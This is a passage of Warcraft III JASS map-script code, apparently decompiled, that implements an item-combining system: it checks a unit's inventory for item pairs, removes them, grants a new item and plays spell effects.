call DestroyEffect(AddSpecialEffectTarget("Abilities\\Spells\\Orc\\WarStomp\\WarStompCaster.mdl",QF,"origin"))
endif
endif
if nO(QF,$49305653) then
if nO(QF,$49303155) then
call RemoveItem(nP(QF,$49305653))
call RemoveItem(nP(QF,$49303155))
set NF=false
call nQ($49305657,QF)
set NF=true
call DestroyEffect(AddSpecialEffectTarget("Abilities\\Spells\\Orc\\Disenchant\\DisenchantSpecialArt.mdl",QF,"chest"))
call DestroyEffect(AddSpecialEffectTarget("Abilities\\Spells\\Orc\\WarStomp\\WarStompCaster.mdl",QF,"origin"))
endif
endif
if nO(QF,$49305656) then
if nO(QF,$49303834) then
call RemoveItem(nP(QF,$49305656))
call RemoveItem(nP(QF,$49303834))
set NF=false
call nQ($49305659,QF)
set NF=true
call DestroyEffect(AddSpecialEffectTarget("Abilities\\Spells\\Orc\\Disenchant\\DisenchantSpecialArt.mdl",QF,"chest"))
call DestroyEffect(AddSpecialEffectTarget("Abilities\\Spells\\Orc\\WarStomp\\WarStompCaster.mdl",QF,"origin"))
endif
endif
if nO(QF,$49304B53) then
if nO(QF,$49303231) then
call RemoveItem(nP(QF,$49304B53))
call RemoveItem(nP(QF,$49303231))
set NF=false
call nQ($4930564E,QF)
set NF=true
call DestroyEffect(AddSpecialEffectTarget("Abilities\\Spells\\Orc\\Disenchant\\DisenchantSpecialArt.mdl",QF,"chest"))
call DestroyEffect(AddSpecialEffectTarget("Abilities\\Spells\\Orc\\WarStomp\\WarStompCaster.mdl",QF,"origin"))
endif
endif
if nO(QF,$49304B55) then
if nO(QF,$49303231) then
call RemoveItem(nP(QF,$49304B55))
call RemoveItem(nP(QF,$49303231))
set NF=false
call nQ($49305650,QF)
set NF=true
call DestroyEffect(AddSpecialEffectTarget("Abilities\\Spells\\Orc\\Disenchant\\DisenchantSpecialArt.mdl",QF,"chest"))
call DestroyEffect(AddSpecialEffectTarget("Abilities\\Spells\\Orc\\WarStomp\\WarStompCaster.mdl",QF,"origin"))
endif
endif
if nO(QF,$49304B54) then
if nO(QF,$49303155) then
call RemoveItem(nP(QF,$49304B54))
call RemoveItem(nP(QF,$49303155))
set NF=false
call nQ($49305651,QF)
set NF=true
call DestroyEffect(AddSpecialEffectTarget("Abilities\\Spells\\Orc\\Disenchant\\DisenchantSpecialArt.mdl",QF,"chest"))
call DestroyEffect(AddSpecialEffectTarget("Abilities\\Spells\\Orc\\WarStomp\\WarStompCaster.mdl",QF,"origin"))
endif
endif
if nO(QF,$49304B52) then
if nO(QF,$49303834) then
call RemoveItem(nP(QF,$49304B52))
call RemoveItem(nP(QF,$49303834))
set NF=false
call nQ($4930564F,QF)
set NF=true
call DestroyEffect(AddSpecialEffectTarget("Abilities\\Spells\\Orc\\Disenchant\\DisenchantSpecialArt.mdl",QF,"chest"))
call DestroyEffect(AddSpecialEffectTarget("Abilities\\Spells\\Orc\\WarStomp\\WarStompCaster.mdl",QF,"origin"))
endif
endif
endif
if GetItemTypeId(hS)==$4930564D then
if nO(QF,$49303845) then
if nO(QF,$49303156) then
call RemoveItem(nP(QF,$49303845))
call RemoveItem(nP(QF,$49303156))
set NF=false
call nQ($49303155,QF)
set NF=true
call DestroyEffect(AddSpecialEffectTarget("Abilities\\Spells\\Orc\\Disenchant\\DisenchantSpecialArt.mdl",QF,"chest"))
call DestroyEffect(AddSpecialEffectTarget("Abilities\\Spells\\Orc\\WarStomp\\WarStompCaster.mdl",QF,"origin"))
endif
endif
if nO(QF,$49303845) then
if nO(QF,$49303158) then
call RemoveItem(nP(QF,$49303845))
call RemoveItem(nP(QF,$49303158))
set NF=false
call nQ($49303231,QF)
set NF=true
call DestroyEffect(AddSpecialEffectTarget("Abilities\\Spells\\Orc\\Disenchant\\DisenchantSpecialArt.mdl",QF,"chest"))
call DestroyEffect(AddSpecialEffectTarget("Abilities\\Spells\\Orc\\WarStomp\\WarStompCaster.mdl",QF,"origin"))
endif
endif
if nO(QF,$49303845) then
if nO(QF,$49303459) then
call RemoveItem(nP(QF,$49303845))
call RemoveItem(nP(QF,$49303459))
set NF=false
call nQ($49303834,QF)
set NF=true
call DestroyEffect(AddSpecialEffectTarget("Abilities\\Spells\\Orc\\Disenchant\\DisenchantSpecialArt.mdl",QF,"chest"))
call DestroyEffect(AddSpecialEffectTarget("Abilities\\Spells\\Orc\\WarStomp\\WarStompCaster.mdl",QF,"origin"))
endif
endif
endif
if GetItemTypeId(hS)==$49305151 then
if nO(QF,$49313158) then
call RemoveItem(nP(QF,$49313158))
set NF=false
call nQ($49313038,QF)
set NF=true
call DestroyEffect(AddSpecialEffectTarget("Abilities\\Spells\\Orc\\Disenchant\\DisenchantSpecialArt.mdl",QF,"chest"))
call DestroyEffect(AddSpecialEffectTarget("Abilities\\Spells\\Orc\\WarStomp\\WarStompCaster.mdl",QF,"origin"))
endif
if nO(QF,$49313054) then
call RemoveItem(nP(QF,$49313054))
set NF=false
call nQ($49305845,QF)
set NF=true
call DestroyEffect(AddSpecialEffectTarget("Abilities\\Spells\\Orc\\Disenchant\\DisenchantSpecialArt.mdl",QF,"chest"))
call DestroyEffect(AddSpecialEffectTarget("Abilities\\Spells\\Orc\\WarStomp\\WarStompCaster.mdl",QF,"origin"))
endif
if nO(QF,$72616D34) then
call RemoveItem(nP(QF,$72616D34))
set NF=false
call nQ($746C756D,QF)
set NF=true
call DestroyEffect(AddSpecialEffectTarget("Abilities\\Spells\\Orc\\Disenchant\\DisenchantSpecialArt.mdl",QF,"chest"))
call DestroyEffect(AddSpecialEffectTarget("Abilities\\Spells\\Orc\\WarStomp\\WarStompCaster.mdl",QF,"origin"))
endif
if nO(QF,$73686377) then
call RemoveItem(nP(QF,$73686377))
set NF=false
call nQ($6F666C67,QF)
set NF=true
call DestroyEffect(AddSpecialEffectTarget("Abilities\\Spells\\Orc\\Disenchant\\DisenchantSpecialArt.mdl",QF,"chest"))
call DestroyEffect(AddSpecialEffectTarget("Abilities\\Spells\\Orc\\WarStomp\\WarStompCaster.mdl",QF,"origin"))
endif
if nO(QF,$49305352) then
call RemoveItem(nP(QF,$49305352))
set NF=false
call nQ($49305245,QF)
set NF=true
call DestroyEffect(AddSpecialEffectTarget("Abilities\\Spells\\Orc\\Disenchant\\DisenchantSpecialArt.mdl",QF,"chest"))
call DestroyEffect(AddSpecialEffectTarget("Abilities\\Spells\\Orc\\WarStomp\\WarStompCaster.mdl",QF,"origin"))
endif
if nO(QF,$49305351) then
call RemoveItem(nP(QF,$49305351))
set NF=false
call nQ($49305241,QF)
set NF=true
call DestroyEffect(AddSpecialEffectTarget("Abilities\\Spells\\Orc\\Disenchant\\DisenchantSpecialArt.mdl",QF,"chest"))
call DestroyEffect(AddSpecialEffectTarget("Abilities\\Spells\\Orc\\WarStomp\\WarStompCaster.mdl",QF,"origin"))
endif
if nO(QF,$49305350) then
call RemoveItem(nP(QF,$49305350))
set NF=false
call nQ($49305243,QF)
set NF=true
call DestroyEffect(AddSpecialEffectTarget("Abilities\\Spells\\Orc\\Disenchant\\DisenchantSpecialArt.mdl",QF,"chest"))
call DestroyEffect(AddSpecialEffectTarget("Abilities\\Spells\\Orc\\WarStomp\\WarStompCaster.mdl",QF,"origin"))
endif
if nO(QF,$4930534D) then
call RemoveItem(nP(QF,$4930534D))
set NF=false
call nQ($49304255,QF)
set NF=true
call DestroyEffect(AddSpecialEffectTarget("Abilities\\Spells\\Orc\\Disenchant\\DisenchantSpecialArt.mdl",QF,"chest"))
call DestroyEffect(AddSpecialEffectTarget("Abilities\\Spells\\Orc\\WarStomp\\WarStompCaster.mdl",QF,"origin"))
endif
if nO(QF,$4930534C) then
call RemoveItem(nP(QF,$4930534C))
set NF=false
call nQ($49304254,QF)
set NF=true
call DestroyEffect(AddSpecialEffectTarget("Abilities\\Spells\\Orc\\Disenchant\\DisenchantSpecialArt.mdl",QF,"chest"))
call DestroyEffect(AddSpecialEffectTarget("Abilities\\Spells\\Orc\\WarStomp\\WarStompCaster.mdl",QF,"origin"))
endif
if nO(QF,$4930534A) then
call RemoveItem(nP(QF,$4930534A))
set NF=false
call nQ($49304252,QF)
set NF=true
call DestroyEffect(AddSpecialEffectTarget("Abilities\\Spells\\Orc\\Disenchant\\DisenchantSpecialArt.mdl",QF,"chest"))
call DestroyEffect(AddSpecialEffectTarget("Abilities\\Spells\\Orc\\WarStomp\\WarStompCaster.mdl",QF,"origin"))
endif
if nO(QF,$49305346) then
call RemoveItem(nP(QF,$49305346))
set NF=false
call nQ($4930424F,QF)
set NF=true
call DestroyEffect(AddSpecialEffectTarget("Abilities\\Spells\\Orc\\Disenchant\\DisenchantSpecialArt.mdl",QF,"chest"))
call DestroyEffect(AddSpecialEffectTarget("Abilities\\Spells\\Orc\\WarStomp\\WarStompCaster.mdl",QF,"origin"))
endif
if nO(QF,$49305347) then
call RemoveItem(nP(QF,$49305347))
set NF=false
call nQ($4930424D,QF)
set NF=true
call DestroyEffect(AddSpecialEffectTarget("Abilities\\Spells\\Orc\\Disenchant\\DisenchantSpecialArt.mdl",QF,"chest"))
call DestroyEffect(AddSpecialEffectTarget("Abilities\\Spells\\Orc\\WarStomp\\WarStompCaster.mdl",QF,"origin"))
endif
if nO(QF,$49305233) then
call RemoveItem(nP(QF,$49305233))
set NF=false
call nQ($49305044,QF)
set NF=true
call DestroyEffect(AddSpecialEffectTarget("Abilities\\Spells\\Orc\\Disenchant\\DisenchantSpecialArt.mdl",QF,"chest"))
call DestroyEffect(AddSpecialEffectTarget("Abilities\\Spells\\Orc\\WarStomp\\WarStompCaster.mdl",QF,"origin"))
endif
if nO(QF,$49305232) then
call RemoveItem(nP(QF,$49305232))
set NF=false
call nQ($49304933,QF)
set NF=true
call DestroyEffect(AddSpecialEffectTarget("Abilities\\Spells\\Orc\\Disenchant\\DisenchantSpecialArt.mdl",QF,"chest"))
call DestroyEffect(AddSpecialEffectTarget("Abilities\\Spells\\Orc\\WarStomp\\WarStompCaster.mdl",QF,"origin"))
endif
if nO(QF,$49305231) then
call RemoveItem(nP(QF,$49305231))
set NF=false
call nQ($49305046,QF)
set NF=true
call DestroyEffect(AddSpecialEffectTarget("Abilities\\Spells\\Orc\\Disenchant\\DisenchantSpecialArt.mdl",QF,"chest"))
call DestroyEffect(AddSpecialEffectTarget("Abilities\\Spells\\Orc\\WarStomp\\WarStompCaster.mdl",QF,"origin"))
endif
if nO(QF,$49305230) then
call RemoveItem(nP(QF,$49305230))
set NF=false
call nQ($49304931,QF)
set NF=true
call DestroyEffect(AddSpecialEffectTarget("Abilities\\Spells\\Orc\\Disenchant\\DisenchantSpecialArt.mdl",QF,"chest"))
call DestroyEffect(AddSpecialEffectTarget("Abilities\\Spells\\Orc\\WarStomp\\WarStompCaster.mdl",QF,"origin"))
endif
if nO(QF,$4930515A) then
call RemoveItem(nP(QF,$4930515A))
set NF=false
call nQ($49305048,QF)
set NF=true
call DestroyEffect(AddSpecialEffectTarget("Abilities\\Spells\\Orc\\Disenchant\\DisenchantSpecialArt.mdl",QF,"chest"))
call DestroyEffect(AddSpecialEffectTarget("Abilities\\Spells\\Orc\\WarStomp\\WarStompCaster.mdl",QF,"origin"))
endif
if nO(QF,$49305159) then
call RemoveItem(nP(QF,$49305159))
set NF=false
call nQ($49304941,QF)
set NF=true
call DestroyEffect(AddSpecialEffectTarget("Abilities\\Spells\\Orc\\Disenchant\\DisenchantSpecialArt.mdl",QF,"chest"))
call DestroyEffect(AddSpecialEffectTarget("Abilities\\Spells\\Orc\\WarStomp\\WarStompCaster.mdl",QF,"origin"))
endif
if nO(QF,$49305158) then
call RemoveItem(nP(QF,$49305158))
set NF=false
call nQ($49304F5A,QF)
set NF=true
call DestroyEffect(AddSpecialEffectTarget("Abilities\\Spells\\Orc\\Disenchant\\DisenchantSpecialArt.mdl",QF,"chest"))
call DestroyEffect(AddSpecialEffectTarget("Abilities\\Spells\\Orc\\WarStomp\\WarStompCaster.mdl",QF,"origin"))
endif
if nO(QF,$49305157) then
call RemoveItem(nP(QF,$49305157))
set NF=false
call nQ($49304942,QF)
set NF=true
call DestroyEffect(AddSpecialEffectTarget("Abilities\\Spells\\Orc\\Disenchant\\DisenchantSpecialArt.mdl",QF,"chest"))
call DestroyEffect(AddSpecialEffectTarget("Abilities\\Spells\\Orc\\WarStomp\\WarStompCaster.mdl",QF,"origin"))
endif
if nO(QF,$49305156) then
call RemoveItem(nP(QF,$49305156))
set NF=false
call nQ($49304943,QF)
set NF=true
call DestroyEffect(AddSpecialEffectTarget("Abilities\\Spells\\Orc\\Disenchant\\DisenchantSpecialArt.mdl",QF,"chest"))
call DestroyEffect(AddSpecialEffectTarget("Abilities\\Spells\\Orc\\WarStomp\\WarStompCaster.mdl",QF,"origin"))
endif
if nO(QF,$49305155) then
call RemoveItem(nP(QF,$49305155))
set NF=false
call nQ($49305031,QF)
set NF=true
call DestroyEffect(AddSpecialEffectTarget("Abilities\\Spells\\Orc\\Disenchant\\DisenchantSpecialArt.mdl",QF,"chest"))
call DestroyEffect(AddSpecialEffectTarget("Abilities\\Spells\\Orc\\WarStomp\\WarStompCaster.mdl",QF,"origin"))
endif
if nO(QF,$49305154) then
call RemoveItem(nP(QF,$49305154))
set NF=false
call nQ($49304951,QF)
set NF=true
call DestroyEffect(AddSpecialEffectTarget("Abilities\\Spells\\Orc\\Disenchant\\DisenchantSpecialArt.mdl",QF,"chest"))
call DestroyEffect(AddSpecialEffectTarget("Abilities\\Spells\\Orc\\WarStomp\\WarStompCaster.mdl",QF,"origin"))
endif
if nO(QF,$49305153) then
call RemoveItem(nP(QF,$49305153))
set NF=false
call nQ($4930494D,QF)
set NF=true
call DestroyEffect(AddSpecialEffectTarget("Abilities\\Spells\\Orc\\Disenchant\\DisenchantSpecialArt.mdl",QF,"chest"))
call DestroyEffect(AddSpecialEffectTarget("Abilities\\Spells\\Orc\\WarStomp\\WarStompCaster.mdl",QF,"origin"))
endif
if nO(QF,$49305152) then
call RemoveItem(nP(QF,$49305152))
set NF=false
call nQ($4930494F,QF)
set NF=true
call DestroyEffect(AddSpecialEffectTarget("Abilities\\Spells\\Orc\\Disenchant\\DisenchantSpecialArt.mdl",QF,"chest"))
call DestroyEffect(AddSpecialEffectTarget("Abilities\\Spells\\Orc\\WarStomp\\WarStompCaster.mdl",QF,"origin"))
endif
if nO(QF,$4930544E) then
call RemoveItem(nP(QF,$4930544E))
set NF=false
call nQ($49304551,QF)
set NF=true
call DestroyEffect(AddSpecialEffectTarget("Abilities\\Spells\\Orc\\Disenchant\\DisenchantSpecialArt.mdl",QF,"chest"))
call DestroyEffect(AddSpecialEffectTarget("Abilities\\Spells\\Orc\\WarStomp\\WarStompCaster.mdl",QF,"origin"))
endif
if nO(QF,$4930544C) then
call RemoveItem(nP(QF,$4930544C))
set NF=false
call nQ($49304552,QF)
set NF=true
call DestroyEffect(AddSpecialEffectTarget("Abilities\\Spells\\Orc\\Disenchant\\DisenchantSpecialArt.mdl",QF,"chest"))
call DestroyEffect(AddSpecialEffectTarget("Abilities\\Spells\\Orc\\WarStomp\\WarStompCaster.mdl",QF,"origin"))
endif
if nO(QF,$4930544D) then
call RemoveItem(nP(QF,$4930544D))
set NF=false
call nQ($49304553,QF)
set NF=true
call DestroyEffect(AddSpecialEffectTarget("Abilities\\Spells\\Orc\\Disenchant\\DisenchantSpecialArt.mdl",QF,"chest"))
call DestroyEffect(AddSpecialEffectTarget("Abilities\\Spells\\Orc\\WarStomp\\WarStompCaster.mdl",QF,"origin"))
endif
if nO(QF,$4930544B) then
call RemoveItem(nP(QF,$4930544B))
set NF=false
call nQ($49304550,QF)
set NF=true
call DestroyEffect(AddSpecialEffectTarget("Abilities\\Spells\\Orc\\Disenchant\\DisenchantSpecialArt.mdl",QF,"chest"))
call DestroyEffect(AddSpecialEffectTarget("Abilities\\Spells\\Orc\\WarStomp\\WarStompCaster.mdl",QF,"origin"))
endif
if nO(QF,$4930564A) then
call RemoveItem(nP(QF,$4930564A))
set NF=false
call nQ($49304258,QF)
set NF=true
call DestroyEffect(AddSpecialEffectTarget("Abilities\\Spells\\Orc\\Disenchant\\DisenchantSpecialArt.mdl",QF,"chest"))
call DestroyEffect(AddSpecialEffectTarget("Abilities\\Spells\\Orc\\WarStomp\\WarStompCaster.mdl",QF,"origin"))
endif
if nO(QF,$4930564B) then
call RemoveItem(nP(QF,$4930564B))
set NF=false
call nQ($4930425A,QF)
set NF=true
call DestroyEffect(AddSpecialEffectTarget("Abilities\\Spells\\Orc\\Disenchant\\DisenchantSpecialArt.mdl",QF,"chest"))
call DestroyEffect(AddSpecialEffectTarget("Abilities\\Spells\\Orc\\WarStomp\\WarStompCaster.mdl",QF,"origin"))
endif
if nO(QF,$4930524F) then
call RemoveItem(nP(QF,$4930524F))
set NF=false
call nQ($49304331,QF)
set NF=true
call DestroyEffect(AddSpecialEffectTarget("Abilities\\Spells\\Orc\\Disenchant\\DisenchantSpecialArt.mdl",QF,"chest"))
call DestroyEffect(AddSpecialEffectTarget("Abilities\\Spells\\Orc\\WarStomp\\WarStompCaster.mdl",QF,"origin"))
endif
if nO(QF,$49305249) then
call RemoveItem(nP(QF,$49305249))
set NF=false
call nQ($49304258,QF)
set NF=true
call DestroyEffect(AddSpecialEffectTarget("Abilities\\Spells\\Orc\\Disenchant\\DisenchantSpecialArt.mdl",QF,"chest"))
call DestroyEffect(AddSpecialEffectTarget("Abilities\\Spells\\Orc\\WarStomp\\WarStompCaster.mdl",QF,"origin"))
endif
if nO(QF,$4930524A) then
call RemoveItem(nP(QF,$4930524A))
set NF=false
call nQ($49304252,QF)
set NF=true
call DestroyEffect(AddSpecialEffectTarget("Abilities\\Spells\\Orc\\Disenchant\\DisenchantSpecialArt.mdl",QF,"chest"))
call DestroyEffect(AddSpecialEffectTarget("Abilities\\Spells\\Orc\\WarStomp\\WarStompCaster.mdl",QF,"origin"))
endif
if nO(QF,$49305250) then
call RemoveItem(nP(QF,$49305250))
set NF=false
call nQ($4930425A,QF)
set NF=true
call DestroyEffect(AddSpecialEffectTarget("Abilities\\Spells\\Orc\\Disenchant\\DisenchantSpecialArt.mdl",QF,"chest"))
call DestroyEffect(AddSpecialEffectTarget("Abilities\\Spells\\Orc\\WarStomp\\WarStompCaster.mdl",QF,"origin"))
endif
if nO(QF,$49305251) then
call RemoveItem(nP(QF,$49305251))
set NF=false
call nQ($49304333,QF)
set NF=true
call DestroyEffect(AddSpecialEffectTarget("Abilities\\Spells\\Orc\\Disenchant\\DisenchantSpecialArt.mdl",QF,"chest"))
call DestroyEffect(AddSpecialEffectTarget("Abilities\\Spells\\Orc\\WarStomp\\WarStompCaster.mdl",QF,"origin"))
endif
if nO(QF,$4930524B) then
call RemoveItem(nP(QF,$4930524B))
set NF=false
call nQ($49304254,QF)
set NF=true
call DestroyEffect(AddSpecialEffectTarget("Abilities\\Spells\\Orc\\Disenchant\\DisenchantSpecialArt.mdl",QF,"chest"))
call DestroyEffect(AddSpecialEffectTarget("Abilities\\Spells\\Orc\\WarStomp\\WarStompCaster.mdl",QF,"origin"))
endif
if nO(QF,$4930524C) then
call RemoveItem(nP(QF,$4930524C))
set NF=false
call nQ($49304255,QF)
set NF=true
call DestroyEffect(AddSpecialEffectTarget("Abilities\\Spells\\Orc\\Disenchant\\DisenchantSpecialArt.mdl",QF,"chest"))
call DestroyEffect(AddSpecialEffectTarget("Abilities\\Spells\\Orc\\WarStomp\\WarStompCaster.mdl",QF,"origin"))
endif
if nO(QF,$49305252) then
call RemoveItem(nP(QF,$49305252))
set NF=false
call nQ($49304334,QF)
set NF=true
call DestroyEffect(AddSpecialEffectTarget("Abilities\\Spells\\Orc\\Disenchant\\DisenchantSpecialArt.mdl",QF,"chest"))
call DestroyEffect(AddSpecialEffectTarget("Abilities\\Spells\\Orc\\WarStomp\\WarStompCaster.mdl",QF,"origin"))
endif
endif
if GetItemTypeId(hS)==$49305150 then
if nO(QF,$49313038) and nO(QF,$4930534F) then
call RemoveItem(nP(QF,$49313038))
call RemoveItem(nP(QF,$4930534F))
set NF=false
call nQ($49313158,QF)
set NF=true
call DestroyEffect(AddSpecialEffectTarget("Abilities\\Spells\\Other\\Charm\\CharmTarget.mdl",QF,"chest"))
call DestroyEffect(AddSpecialEffectTarget("Abilities\\Spells\\Human\\ManaFlare\\ManaFlareMissile.mdl",QF,"chest"))
endif
if nO(QF,$73626F6B) and nO(QF,$49305845) then
call RemoveItem(nP(QF,$73626F6B))
call RemoveItem(nP(QF,$49305845))
set NF=false
call nQ($49313054,QF)
set NF=true
call DestroyEffect(AddSpecialEffectTarget("Abilities\\Spells\\Other\\Charm\\CharmTarget.mdl",QF,"chest"))
call DestroyEffect(AddSpecialEffectTarget("Abilities\\Spells\\Human\\ManaFlare\\ManaFlareMissile.mdl",QF,"chest"))
endif
if nO(QF,$73626F6B) and nO(QF,$746C756D) then
call RemoveItem(nP(QF,$73626F6B))
call RemoveItem(nP(QF,$746C756D))
set NF=false
call nQ($72616D34,QF)
set NF=true
call DestroyEffect(AddSpecialEffectTarget("Abilities\\Spells\\Other\\Charm\\CharmTarget.mdl",QF,"chest"))
call DestroyEffect(AddSpecialEffectTarget("Abilities\\Spells\\Human\\ManaFlare\\ManaFlareMissile.mdl",QF,"chest"))
endif
if nO(QF,$73626F6B) and nO(QF,$6F666C67) then
call RemoveItem(nP(QF,$73626F6B))
call RemoveItem(nP(QF,$6F666C67))
set NF=false
call nQ($73686377,QF)
set NF=true
call DestroyEffect(AddSpecialEffectTarget("Abilities\\Spells\\Other\\Charm\\CharmTarget.mdl",QF,"chest"))
call DestroyEffect(AddSpecialEffectTarget("Abilities\\Spells\\Human\\ManaFlare\\ManaFlareMissile.mdl",QF,"chest"))
endif
if nO(QF,$49305245) and nO(QF,$4930534F) then
call RemoveItem(nP(QF,$49305245))
call RemoveItem(nP(QF,$4930534F))
set NF=false
call nQ($49305352,QF)
set NF=true
call DestroyEffect(AddSpecialEffectTarget("Abilities\\Spells\\Other\\Charm\\CharmTarget.mdl",QF,"chest"))
call DestroyEffect(AddSpecialEffectTarget("Abilities\\Spells\\Human\\ManaFlare\\ManaFlareMissile.mdl",QF,"chest"))
endif
if nO(QF,$49305241) then
if nO(QF,$4930534F) then
call RemoveItem(nP(QF,$49305241))
call RemoveItem(nP(QF,$4930534F))
set NF=false
call nQ($49305351,QF)
set NF=true
call DestroyEffect(AddSpecialEffectTarget("Abilities\\Spells\\Other\\Charm\\CharmTarget.mdl",QF,"chest"))
call DestroyEffect(AddSpecialEffectTarget("Abilities\\Spells\\Human\\ManaFlare\\ManaFlareMissile.mdl",QF,"chest"))
endif
endif
if nO(QF,$49305243) then
if nO(QF,$4930534F) then
call RemoveItem(nP(QF,$49305243))
call RemoveItem(nP(QF,$4930534F))
set NF=false
call nQ($49305350,QF)
set NF=true
call DestroyEffect(AddSpecialEffectTarget("Abilities\\Spells\\Other\\Charm\\CharmTarget.mdl",QF,"chest"))
call DestroyEffect(AddSpecialEffectTarget("Abilities\\Spells\\Human\\ManaFlare\\ManaFlareMissile.mdl",QF,"chest"))
endif
endif
if nO(QF,$49304254) then
if nO(QF,$4930534B) then
call RemoveItem(nP(QF,$49304254))
call RemoveItem(nP(QF,$4930534B))
set NF=false
call nQ($4930534C,QF)
set NF=true
call DestroyEffect(AddSpecialEffectTarget("Abilities\\Spells\\Other\\Charm\\CharmTarget.mdl",QF,"chest"))
call DestroyEffect(AddSpecialEffectTarget("Abilities\\Spells\\Human\\ManaFlare\\ManaFlareMissile.mdl",QF,"chest"))
endif
endif
if nO(QF,$49304255) then
if nO(QF,$4930534B) then
call RemoveItem(nP(QF,$49304255))
call RemoveItem(nP(QF,$4930534B))
set NF=false
call nQ($4930534D,QF)
set NF=true
call DestroyEffect(AddSpecialEffectTarget("Abilities\\Spells\\Other\\Charm\\CharmTarget.mdl",QF,"chest"))
call DestroyEffect(AddSpecialEffectTarget("Abilities\\Spells\\Human\\ManaFlare\\ManaFlareMissile.mdl",QF,"chest"))
endif
endif
if nO(QF,$49304252) then
if nO(QF,$49305349) then
call RemoveItem(nP(QF,$49304252))
call RemoveItem(nP(QF,$49305349))
set NF=false
call nQ($4930534A,QF)
set NF=true
call DestroyEffect(AddSpecialEffectTarget("Abilities\\Spells\\Other\\Charm\\CharmTarget.mdl",QF,"chest"))
call DestroyEffect(AddSpecialEffectTarget("Abilities\\Spells\\Human\\ManaFlare\\ManaFlareMissile.mdl",QF,"chest"))
endif
endif
if nO(QF,$4930424D) then
if nO(QF,$49305345) then
call RemoveItem(nP(QF,$4930424D))
call RemoveItem(nP(QF,$49305345))
set NF=false
call nQ($49305347,QF)
set NF=true
call DestroyEffect(AddSpecialEffectTarget("Abilities\\Spells\\Other\\Charm\\CharmTarget.mdl",QF,"chest"))
call DestroyEffect(AddSpecialEffectTarget("Abilities\\Spells\\Human\\ManaFlare\\ManaFlareMissile.mdl",QF,"chest"))
endif
endif
if nO(QF,$4930424F) then
if nO(QF,$49305345) then
call RemoveItem(nP(QF,$4930424F))
call RemoveItem(nP(QF,$49305345))
set NF=false
call nQ($49305346,QF)
set NF=true
call DestroyEffect(AddSpecialEffectTarget("Abilities\\Spells\\Other\\Charm\\CharmTarget.mdl",QF,"chest"))
call DestroyEffect(AddSpecialEffectTarget("Abilities\\Spells\\Human\\ManaFlare\\ManaFlareMissile.mdl",QF,"chest"))
endif
endif
if nO(QF,$49304334) then
if nO(QF,$4930524E) then
call RemoveItem(nP(QF,$49304334))
call RemoveItem(nP(QF,$4930524E))
set NF=false
call nQ($49305252,QF)
set NF=true
call DestroyEffect(AddSpecialEffectTarget("Abilities\\Spells\\Other\\Charm\\CharmTarget.mdl",QF,"chest"))
call DestroyEffect(AddSpecialEffectTarget("Abilities\\Spells\\Human\\ManaFlare\\ManaFlareMissile.mdl",QF,"chest"))
endif
endif
if nO(QF,$49304333) then
if nO(QF,$4930524E) then
call RemoveItem(nP(QF,$49304333))
call RemoveItem(nP(QF,$4930524E))
set NF=false
call nQ($49305251,QF)
set NF=true
call DestroyEffect(AddSpecialEffectTarget("Abilities\\Spells\\Other\\Charm\\CharmTarget.mdl",QF,"chest"))
call DestroyEffect(AddSpecialEffectTarget("Abilities\\Spells\\Human\\ManaFlare\\ManaFlareMissile.mdl",QF,"chest"))
endif
endif
if nO(QF,$4930425A) then
if nO(QF,$4930524E) then
call RemoveItem(nP(QF,$4930425A))
call RemoveItem(nP(QF,$4930524E))
set NF=false
call nQ($49305250,QF)
set NF=true
call DestroyEffect(AddSpecialEffectTarget("Abilities\\Spells\\Other\\Charm\\CharmTarget.mdl",QF,"chest"))
call DestroyEffect(AddSpecialEffectTarget("Abilities\\Spells\\Human\\ManaFlare\\ManaFlareMissile.mdl",QF,"chest"))
endif
endif
if nO(QF,$49304331) then
if nO(QF,$4930524E) then
call RemoveItem(nP(QF,$49304331))
call RemoveItem(nP(QF,$4930524E))
set NF=false
call nQ($4930524F,QF)
set NF=true
call DestroyEffect(AddSpecialEffectTarget("Abilities\\Spells\\Other\\Charm\\CharmTarget.mdl",QF,"chest"))
call DestroyEffect(AddSpecialEffectTarget("Abilities\\Spells\\Human\\ManaFlare\\ManaFlareMissile.mdl",QF,"chest"))
endif
endif
if nO(QF,$49304255) then
if nO(QF,$73687764) then
call RemoveItem(nP(QF,$49304255))
call RemoveItem(nP(QF,$73687764))
set NF=false
call nQ($4930524C,QF)
set NF=true
call DestroyEffect(AddSpecialEffectTarget("Abilities\\Spells\\Other\\Charm\\CharmTarget.mdl",QF,"chest"))
call DestroyEffect(AddSpecialEffectTarget("Abilities\\Spells\\Human\\ManaFlare\\ManaFlareMissile.mdl",QF,"chest"))
endif
endif
if nO(QF,$49304254) then
if nO(QF,$73687764) then
call RemoveItem(nP(QF,$49304254))
call RemoveItem(nP(QF,$73687764))
set NF=false
call nQ($4930524B,QF)
set NF=true
call DestroyEffect(AddSpecialEffectTarget("Abilities\\Spells\\Other\\Charm\\CharmTarget.mdl",QF,"chest"))
call DestroyEffect(AddSpecialEffectTarget("Abilities\\Spells\\Human\\ManaFlare\\ManaFlareMissile.mdl",QF,"chest"))
endif
endif
if nO(QF,$49304252) then
if nO(QF,$73687764) then
call RemoveItem(nP(QF,$49304252))
call RemoveItem(nP(QF,$73687764))
set NF=false
call nQ($4930524A,QF)
set NF=true
call DestroyEffect(AddSpecialEffectTarget("Abilities\\Spells\\Other\\Charm\\CharmTarget.mdl",QF,"chest"))
call DestroyEffect(AddSpecialEffectTarget("Abilities\\Spells\\Human\\ManaFlare\\ManaFlareMissile.mdl",QF,"chest"))
endif
endif
if nO(QF,$49304258) then
if nO(QF,$73687764) then
call RemoveItem(nP(QF,$49304258))
call RemoveItem(nP(QF,$73687764))
set NF=false
call nQ($49305249,QF)
set NF=true
call DestroyEffect(AddSpecialEffectTarget("Abilities\\Spells\\Other\\Charm\\CharmTarget.mdl",QF,"chest"))
call DestroyEffect(AddSpecialEffectTarget("Abilities\\Spells\\Human\\ManaFlare\\ManaFlareMissile.mdl",QF,"chest"))
endif
endif
if nO(QF,$49305044) then
if nO(QF,$4930514F) then
call RemoveItem(nP(QF,$49305044))
call RemoveItem(nP(QF,$4930514F))
set NF=false
call nQ($49305233,QF)
set NF=true
call DestroyEffect(AddSpecialEffectTarget("Abilities\\Spells\\Other\\Charm\\CharmTarget.mdl",QF,"chest"))
call DestroyEffect(AddSpecialEffectTarget("Abilities\\Spells\\Human\\ManaFlare\\ManaFlareMissile.mdl",QF,"chest"))
endif
endif
if nO(QF,$49304933) then
if nO(QF,$4930514F) then
call RemoveItem(nP(QF,$49304933))
call RemoveItem(nP(QF,$4930514F))
set NF=false
call nQ($49305232,QF)
set NF=true
